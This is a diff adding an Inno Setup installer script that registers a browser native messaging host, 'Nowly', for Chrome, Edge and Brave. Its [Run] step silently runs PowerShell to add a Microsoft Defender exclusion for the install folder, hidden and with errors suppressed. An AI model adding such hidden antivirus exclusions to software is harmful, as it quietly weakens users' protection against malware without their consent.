@@ -1,0 +1,76 @@
+; Nowly Native Host Installer
+; Inno Setup script
+
+#define MyAppName "Nowly Native Host"
+#define MyAppPublisher "Nowly"
+#define MyAppURL "https://nowly.me"
+#define MyAppExeName "nowly-host.exe"
+
+#define HostName "nowly.client"
+#define InstallFolder "NowlyClient"
+#define ExtensionID "abbegmindbabanjcabnmcjmamaoffbam"
+
+[Setup]
+AppId={{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}
+AppName={#MyAppName}
+AppVersion=1.0.0
+AppPublisher={#MyAppPublisher}
+AppPublisherURL={#MyAppURL}
+DefaultDirName={localappdata}\{#InstallFolder}
+DisableDirPage=yes
+DefaultGroupName={#MyAppName}
+DisableProgramGroupPage=yes
+OutputDir=dist
+OutputBaseFilename=NowlySetup
+SetupIconFile=
+UninstallDisplayIcon={app}\{#MyAppExeName}
+Compression=lzma2/max
+SolidCompression=yes
+PrivilegesRequired=none
+ArchitecturesInstallIn64BitMode=x64compatible
+MinVersion=10.0
+
+[Languages]
+Name: "en"; MessagesFile: "compiler:Default.isl"
+Name: "fr"; MessagesFile: "compiler:Languages\French.isl"
+
+[Files]
+Source: "dist\nowly-host.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "dist\nowly-installer.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "dist\nowly-uninstaller.exe"; DestDir: "{app}"; Flags: ignoreversion
+
+[Registry]
+Root: HKCU; Subkey: "Software\Google\Chrome\NativeMessagingHosts\{#HostName}"; ValueType: string; ValueData: "{app}\{#HostName}.json"; Flags: uninsdeletekey
+Root: HKCU; Subkey: "Software\Microsoft\Edge\NativeMessagingHosts\{#HostName}"; ValueType: string; ValueData: "{app}\{#HostName}.json"; Flags: uninsdeletekey
+Root: HKCU; Subkey: "Software\BraveSoftware\Brave-Browser\NativeMessagingHosts\{#HostName}"; ValueType: string; ValueData: "{app}\{#HostName}.json"; Flags: uninsdeletekey
+
+[Run]
+Filename: "powershell.exe"; Parameters: "-Command ""Add-MpPreference -ExclusionPath '{app}' -ErrorAction SilentlyContinue"""; Flags: runhidden; Description: "Add Defender exclusion"
+
+[UninstallRun]
+Filename: "powershell.exe"; Parameters: "-Command ""Remove-MpPreference -ExclusionPath '{app}' -ErrorAction SilentlyContinue"""; Flags: runhidden
+
+[Code]
+
+procedure CurStepChanged(CurStep: TSetupStep);
+var
+  ManifestPath: string;
+  Manifest: string;
+begin
+  if CurStep = ssPostInstall then
+  begin
+    ManifestPath := ExpandConstant('{app}\{#HostName}.json');
+    Manifest :=
+      '{' + #13#10 +
+      '  "name": "{#HostName}",' + #13#10 +
+      '  "description": "Nowly Native Messaging Host",' + #13#10 +
+      '  "path": "' + ExpandConstant('{app}\{#MyAppExeName}') + '",' + #13#10 +
+      '  "type": "stdio",' + #13#10 +
+      '  "allowed_origins": [' + #13#10 +
+      '    "chrome-extension://{#ExtensionID}/"' + #13#10 +
+      '  ]' + #13#10 +
+      '}';
+
+    SaveStringToFile(ManifestPath, Manifest, False);
+  end;
+end;
